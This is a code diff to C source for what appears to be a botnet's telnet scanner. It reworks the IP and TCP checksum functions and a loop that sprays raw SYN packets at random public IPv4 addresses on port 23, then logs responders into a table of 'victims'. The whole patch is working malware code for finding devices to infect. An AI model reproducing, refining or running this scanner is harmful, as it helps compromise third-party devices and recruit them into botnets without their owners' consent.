@@ -34,33 +34,51 @@ void scan_init(void)
 	return;
 }
 
-// Checksum calculator
+// Checksum calculators
 // Only for use in this file
 // Not mine!
-static unsigned short csum(unsigned short *ptr, int nbytes)
+uint16_t checksum_generic(uint16_t *addr, uint32_t count)
 {
-	register long sum;
-	unsigned short oddbyte;
-	register short answer;
+    register unsigned long sum = 0;
 
-	sum = 0;
-	while (nbytes > 1)
-	{
-		sum += *ptr++;
-		nbytes -= 2;
-	}
-	if (nbytes == 1)
-	{
-		oddbyte = 0;
-		*((u_char *)&oddbyte) = *(u_char *) ptr;
-		sum += oddbyte;
-	}
+    for (sum = 0; count > 1; count -= 2)
+        sum += *addr++;
+    if (count == 1)
+        sum += (char)*addr;
 
-	sum = (sum >> 16) + (sum & 0xffff);
-	sum = sum + (sum >> 16);
-	answer = (short) ~sum;
+    sum = (sum >> 16) + (sum & 0xFFFF);
+    sum += (sum >> 16);
+    
+    return ~sum;
+}
+uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
+{
+    const uint16_t *buf = buff;
+    uint32_t ip_src = iph->saddr;
+    uint32_t ip_dst = iph->daddr;
+    uint32_t sum = 0;
+    
+    while (len > 1)
+    {
+        sum += *buf;
+        buf++;
+        len -= 2;
+    }
 
-	return (answer);
+    if (len == 1)
+        sum += *((uint8_t *) buf);
+
+    sum += (ip_src >> 16) & 0xFFFF;
+    sum += ip_src & 0xFFFF;
+    sum += (ip_dst >> 16) & 0xFFFF;
+    sum += ip_dst & 0xFFFF;
+    sum += htons(iph->protocol);
+    sum += data_len;
+
+    while (sum >> 16) 
+        sum = (sum & 0xFFFF) + (sum >> 16);
+
+    return ((uint16_t) (~sum));
 }
 
 #define TELNET_DO 0xFD
@@ -159,7 +177,9 @@ bool scan_scanner(void)
 {
 	int32_t max = getdtablesize();
 	printd("Maximum files open: %d", max)
-
+#ifdef DEBUG
+	uint64_t sent = 0;
+#endif
 	if (scan_able == false || scan_scanning == true)
 		_exit(0);
 
@@ -178,12 +198,11 @@ bool scan_scanner(void)
 	zero(datagram, 200);
 
 	// IP and TCP  structures
-	struct iphdr *iph = (struct iphdr *) datagram;
-	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
+	struct iphdr *iph = (struct iphdr *)datagram;
+	struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
 
 	/* sockaddr struct and checksum struct */
 	struct sockaddr_in addr;
-	struct pseudo_header psh;
 
 	if (ipv4_getinfo(&LOCAL_ADDR) == false)
 		goto end;
@@ -198,11 +217,7 @@ bool scan_scanner(void)
 
 	// Sockaddr header fillout
 	addr.sin_family = AF_INET;
-
-	// Pseudo header fillout
-	psh.source_address = LOCAL_ADDR;
-	psh.placeholder = 0;
-	psh.protocol = 6; // TCP
+	addr.sin_port = htons(23);
 
 	// IP header fillout
 	iph->saddr = LOCAL_ADDR;
@@ -210,7 +225,6 @@ bool scan_scanner(void)
 	iph->version = 4;
 	iph->tos = 0; // TOS = Type of service Can change QoS
 	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
-	iph->id = htons(54321); // Id of this packet
 	iph->frag_off = htons(16384);
 	iph->ttl = 64; // TTL = TTL goes down onces for ever re-router it hits. If it hits 0 its discarded and icmp error sent
 	iph->protocol = 6; // 6 = TCP
@@ -218,7 +232,6 @@ bool scan_scanner(void)
 	// TCP header fillout
 	tcph->source = htons(LOCAL_PORT);
 	tcph->dest = htons(23); // Port 23 dest
-	tcph->seq = htonl(1105024978);
 	tcph->ack_seq = 0;
 	tcph->doff = sizeof(struct tcphdr) / 4; // Size of tcp header
 	tcph->fin = 0;
@@ -231,7 +244,7 @@ bool scan_scanner(void)
 	tcph->urg_ptr = 0;
 
 	// Create a raw socket
-	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
+	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
 	{
 		printd("Failed to open raw socket");
 		goto end;
@@ -249,37 +262,35 @@ bool scan_scanner(void)
 		goto end;
 	}
 
-	memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
-
 	while (1)
 	{
 		for (i = 0; i < SCAN_SCANNER_BURST; i++)
 		{
-			addr.sin_addr.s_addr = ipv4_random_public(); // It should already be a 32 bit uint
-			iph->daddr = addr.sin_addr.s_addr;
-			// Reset the checksums
+			iph->daddr = ipv4_random_public();
+			iph->id = (rand() % 65535); // This line might be wrong
 			iph->check = 0;
+			iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+
+			tcph->seq = iph->daddr;
 			tcph->check = 0;
+			tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));
 
-			// Set up the checksums
-			psh.dest_address = addr.sin_addr.s_addr;
-			psh.tcp_length = htons(sizeof(struct tcphdr));
-
-			// memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
-
-			// Make the checksums
-			iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
-			tcph->check = csum((unsigned short *)&psh, sizeof(struct pseudo_header));
+			// Fill out addr
+			addr.sin_addr.s_addr = iph->daddr;
 
 			// Send the packet
-			if (sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+			if (sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr)) == -1)
 			{
 				if (++fails >= SCAN_SCANNER_ERRMAX)
 				{
-					printd("Fails has surpassed %d Resetting fail count", SCAN_SCANNER_ERRMAX);
+					printd("Fails/sent: %d/%d", fails, sent);
 					fails = 0;
+					sent = 0;
 				}
 			}
+#ifdef DEBUG
+			sent++;
+#endif
 		}
 		i = 0;
 		while (1)
@@ -290,11 +301,10 @@ bool scan_scanner(void)
 			errno = 0;
 
 			n = recvfrom(sock, buf, sizeof(buf), MSG_NOSIGNAL, NULL, NULL);
-			if (n <= 0 /*|| errno == EAGAIN || errno == EWOULDBLOCK*/&& errno != 0)
+			if (n <= 0 /*|| errno == EAGAIN || errno == EWOULDBLOCK*/|| errno != 0)
 				break;
 
-			printf("%s->%s %d %d %d %d %d\n", ipv4_unpack(riph->saddr), ipv4_unpack(riph->daddr), riph->protocol, rtcph->syn, rtcph->ack, htons(rtcph->source), htons(rtcph->dest));
-
+			// printf("%s->%s %d %d %d %d %d errno %d\n", ipv4_unpack(riph->saddr), ipv4_unpack(riph->daddr), riph->protocol, rtcph->syn, rtcph->ack, htons(rtcph->source), htons(rtcph->dest), errno);
 			if (riph->protocol != 6) // Packet needs to be TCP
 				break;
 			if (rtcph->syn != 1)
@@ -304,7 +314,7 @@ bool scan_scanner(void)
 			if (rtcph->source != htons(23))
 				break;
 
-			printd("Got a live one: %s flags: SYN %d ACK %d FIN %d", ipv4_unpack(riph->saddr), rtcph->syn, rtcph->ack,rtcph->fin);
+			printd("Got a live one: %s flags: SYN %d ACK %d FIN %d", ipv4_unpack(riph->saddr), rtcph->syn, rtcph->ack, rtcph->fin);
 			
 			struct scan_victim *victim;
 			victim = &victim_table[i];
